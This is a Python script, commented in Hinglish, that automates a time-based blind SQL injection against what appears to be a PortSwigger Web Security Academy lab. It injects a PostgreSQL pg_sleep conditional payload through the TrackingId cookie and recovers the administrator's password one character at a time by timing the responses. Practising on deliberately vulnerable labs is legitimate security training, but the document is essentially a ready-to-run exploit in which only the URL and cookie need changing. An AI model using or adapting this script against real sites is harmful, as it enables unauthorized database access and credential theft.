import time
import string
import requests

# ==================== CONFIGURATION (HAR BAR YAHAN BADLEIN) ====================
# 1. Apni active Lab ki URL yahan daaliye:
TARGET_URL = "https://0a4d0019047a5b40806c9aff00f9002c.web-security-academy.net/filter?category=Lifestyle"

# 2. Apni Burp Suite se mili asli TrackingId cookie bina kisi quote ke yahan daaliye:
TARGET_COOKIE = "4S4gKFjmhlctM6VI"

# 3. Password ki total length jitni check karni hai:
PASSWORD_LENGTH = 20  
# ==============================================================================

CHARSET = string.ascii_lowercase + string.digits  # a-z aur 0-9
extracted_password = ""

print("[*] Cracking Admin Password via Time-Based Blind SQLi...")
print(f"[-] Target URL: {TARGET_URL}")
print(f"[-] Base Cookie: {TARGET_COOKIE}")
print("-" * 60)

for position in range(1, PASSWORD_LENGTH + 1):
    found_char = False
    for char in CHARSET:
        
        # 🎯 AUTOMATIC PAYLOAD GENERATION: Aapki di hui cookie shuruat mein khud ba khud jud jayegi
        payload = f"{TARGET_COOKIE}' || (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END) || '"
        
        cookies = {'TrackingId': payload}
        
        start_time = time.time()
        try:
            response = requests.get(TARGET_URL, cookies=cookies, timeout=8)
        except requests.exceptions.Timeout:
            pass
            
        end_time = time.time()
        time_taken = end_time - start_time
        
        # Live status update terminal par
        print(f"[Testing] Pos {position} | Char: '{char}' | Time: {time_taken:.2f}s", end="\r")
        
        # Agar delay 4.5 seconds se upar hai, toh character pakda gaya!
        if time_taken >= 4.5:
            extracted_password += char
            print(f"\n[+] SUCCESS!! Position {position}: Found -> '{char}' | Password: {extracted_password}\n")
            found_char = True
            break  
            
    if not found_char:
        print(f"\n[-] Position {position}: Character nahi mil paya. Moving ahead...")

print("-" * 60)
print(f"[📊] Final Administrator Password: {extracted_password}")
print("-" * 60)
input("\n[+] Extraction complete! Press ENTER to close...")